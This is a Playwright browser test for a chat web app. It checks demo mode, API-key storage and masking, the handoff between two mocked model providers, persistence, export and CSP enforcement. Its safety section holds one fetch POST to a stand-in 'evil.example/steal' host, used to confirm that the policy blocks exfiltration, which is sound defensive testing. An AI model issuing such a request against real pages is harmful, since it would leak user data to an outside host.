// Browser end-to-end for the web edition. Needs Playwright (PWMOD=<path to playwright>) and Chromium.
//   PWMOD=$(npm root -g)/playwright node tests/web/e2e.mjs [screenshot-dir]
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.join(here, '..', '..');
const require = createRequire(import.meta.url);
const { chromium } = require(process.env.PWMOD || 'playwright');
const shots = process.argv[2];

// Serve web/ with the CSP from netlify.toml, so the policy is exercised, not assumed.
const toml = fs.readFileSync(path.join(root, 'netlify.toml'), 'utf8');
const csp = /Content-Security-Policy = "([^"]+)"/.exec(toml)[1];
const types = { '.html': 'text/html', '.js': 'text/javascript', '.svg': 'image/svg+xml', '.png': 'image/png', '.woff2': 'font/woff2' };
const srv = http.createServer((req, res) => {
  let p = decodeURIComponent(req.url.split('?')[0]); if (p === '/') p = '/index.html';
  const f = path.join(root, 'web', p);
  if (!f.startsWith(path.join(root, 'web')) || !fs.existsSync(f)) { res.writeHead(404); res.end('nf'); return; }
  res.writeHead(200, { 'Content-Type': types[path.extname(f)] || 'application/octet-stream', 'Content-Security-Policy': csp });
  res.end(fs.readFileSync(f));
});
await new Promise(r => srv.listen(0, '127.0.0.1', r));
const base = `http://127.0.0.1:${srv.address().port}`;

let fails = 0;
const ok = (cond, label) => { console.log(cond ? '  ok  ' : '  FAIL', label); if (!cond) fails++; };
const CORS = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' };
const sseBody = text => text.match(/.{1,14}/gs).map(c => `data: ${JSON.stringify({ choices: [{ delta: { content: c } }] })}\n\n`).join('') + 'data: [DONE]\n\n';
const REPLY = '<context>\nfact | /task/inputs/rooms | the hostel has 24 rooms\nconstraint | /project/constraints/db | use PostgreSQL only\n</context>\nHere is a first schema: rooms, guests and bookings tables.';

const browser = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium' });
const ctx = await browser.newContext({ viewport: { width: 1360, height: 820 }, acceptDownloads: true });
const page = await ctx.newPage();
const errors = [], outbound = [];
page.on('pageerror', e => errors.push(String(e)));
page.on('request', r => { const u = r.url(); if (!u.startsWith(base)) outbound.push(u); });
await page.route('https://cdnjs.cloudflare.com/**', r => r.abort());           // optional highlight/maths scripts
await page.route('https://api.groq.com/**', r => r.request().method() === 'OPTIONS'
  ? r.fulfill({ status: 204, headers: CORS })
  : r.fulfill({ status: 429, headers: { ...CORS, 'content-type': 'application/json' }, body: JSON.stringify({ error: { message: 'rate limit reached, try again in 7s' } }) }));
await page.route('https://openrouter.ai/**', r => r.request().method() === 'OPTIONS'
  ? r.fulfill({ status: 204, headers: CORS })
  : r.fulfill({ status: 200, headers: { ...CORS, 'content-type': 'text/event-stream' }, body: sseBody(REPLY) }));

await page.goto(base + '/'); await page.waitForTimeout(900);
console.log('demo mode');
ok(await page.locator('#modeBadge').textContent() === 'demo', 'badge says demo with no keys');
ok(await page.locator('.setup-banner').count() === 1, 'demo banner shown');
ok(await page.locator('#newBuildBtn').isHidden() && await page.locator('#connBtn').isHidden() && await page.locator('#attachBtn').isHidden(), 'Build, connectors and attachments are hidden');
ok(await page.locator('[data-lane=pipeline]').isHidden(), 'Pipeline is hidden');
if (shots) await page.screenshot({ path: path.join(shots, 'web-welcome.png') });
await page.fill('#input', 'hello there'); await page.press('#input', 'Enter'); await page.waitForTimeout(1200);
ok(/simulated reply/.test(await page.locator('.msg.bot .body').last().textContent()), 'a simulated reply streams in demo mode');

console.log('keys');
await page.click('#keysBtn'); await page.waitForSelector('.kcard');
ok(/stored only in this browser/.test(await page.locator('#dlgBody').textContent()), 'dialog says keys stay in the browser');
const fill = async (pid, v) => { const c = page.locator(`.kcard[data-pid=${pid}]`); await c.locator('input[data-secret]').fill(v); await c.locator('[data-save]').click(); await page.waitForTimeout(500); };
await fill('groq', 'gsk_test_key_ABCDEFGH1234');
await fill('openrouter', 'sk-or-test-key-ABCDEFGH5678');
ok(/…5678/.test(await page.locator('.kcard[data-pid=openrouter] .st').textContent()), 'key saved and masked');
ok(!(await page.content()).includes('gsk_test_key_ABCDEFGH1234'), 'the saved key is not in the page');
if (shots) await page.screenshot({ path: path.join(shots, 'web-keys.png') });
await page.keyboard.press('Escape');
ok(await page.locator('#modeBadge').textContent() === 'web', 'badge says web once a key is saved');

console.log('handoff');
await page.click('#newBtn'); await page.waitForTimeout(500);
await page.fill('#input', 'Design a database schema for a hostel booking app'); await page.press('#input', 'Enter');
await page.waitForSelector('.msg.bot:not([aria-busy=true]) .body', { timeout: 15000 }); await page.waitForTimeout(600);
const seam = page.locator('[data-seam]').first();
ok(await seam.count() === 1 && /groq .* openrouter/.test(await seam.textContent()), 'the handoff seam shows groq to openrouter');
ok(/first schema/.test(await page.locator('.msg.bot .body').last().textContent()), 'the second model answered');
ok(!/<context>/.test(await page.locator('#thread').textContent()), 'the context block is hidden');
await page.click('#memBtn'); await page.waitForTimeout(700);
ok(await page.locator('.unit').count() >= 3, 'the ledger lists what was remembered');
if (shots) await page.screenshot({ path: path.join(shots, 'web-chat.png') });

console.log('persistence and export');
await page.reload(); await page.waitForTimeout(900);
ok(await page.locator('#convList .conv').count() >= 2, 'chats survive a reload');
await page.locator('#convList .conv a').first().click(); await page.waitForTimeout(600);
ok(/first schema/.test(await page.locator('#thread').textContent()), 'the conversation reopens with its messages');
const dl = page.waitForEvent('download');
await page.click('#exportBtn'); await page.waitForSelector('#transDl'); await page.click('#transDl');
const d = await dl; ok(/\.md$/.test(d.suggestedFilename()), `transcript downloads as ${d.suggestedFilename()}`);

console.log('safety');
await page.keyboard.press('Escape');
const evil = await page.evaluate(() => fetch('https://evil.example/steal', { method: 'POST', body: 'x' }).then(() => 'sent', () => 'blocked'));
ok(evil === 'blocked', 'the policy blocks sending anything to an unlisted host');
const stray = outbound.filter(u => !/^https:\/\/(api\.groq\.com|openrouter\.ai|cdnjs\.cloudflare\.com|evil\.example)\//.test(u));
ok(stray.length === 0, `no requests to unexpected hosts ${JSON.stringify(stray)}`);
ok(errors.length === 0, `no page errors ${JSON.stringify(errors)}`);
const keysOnWire = outbound.some(u => /gsk_|sk-or-/.test(u));
ok(!keysOnWire, 'no key appears in any URL');

await browser.close(); srv.close();
console.log(fails ? `\n${fails} check(s) failed` : '\nall browser checks passed');
process.exit(fails ? 1 : 0);
